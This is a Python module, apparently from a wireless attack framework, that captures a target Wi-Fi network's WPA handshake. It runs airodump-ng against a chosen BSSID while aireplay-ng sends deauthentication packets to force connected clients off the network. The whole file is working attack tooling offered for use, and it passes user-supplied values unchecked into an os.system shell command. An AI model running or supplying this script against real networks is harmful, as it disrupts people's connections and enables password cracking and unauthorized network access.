import time,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "getting_handshake",
        "title"       : "Getting handshake of network ",
        "module"      : "wireless/wifi/attack getting handshake network  network_manager",
        "description" : "getting handshake of network"
}

options ={
  "INTERFACE" : [str(var.interface[0]),'enter the interface [wlan0/wlan0mon]'],
  "BSSID"     : [str(var.bssid[0]),'enter the bssid of the target'],
  "CHANNEL"   : [str(var.channel[0]),'enter the channel of the network'],
  "PATH"      : [str(var.path[0]),'enter the path of the output file'],
  "DIST"      : [str(var.dist[0]),'enter the number of the packets [1-10000] ( 0 for unlimited number)']

}

def running():
        try:
                print ("")
                print (blue+"[*]"+default+ "Starting a getting handshake")
                time.sleep(2)
                print ("")
                time.sleep(2)
                print ("") 
                order = "airodump-ng {} --bssid {} -c {} -w {} & xterm -e aireplay-ng -0 {} -a {} {}".format(var.interface[0],var.bssid[0],var.channel[0],var.path[0],var.dist[0],var.bssid[0],var.interface[0])
                geny = os.system(order)
                print("\n")
                print (green_underline+"[*] Done"+default)
                time.sleep(2)
                print ("")
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
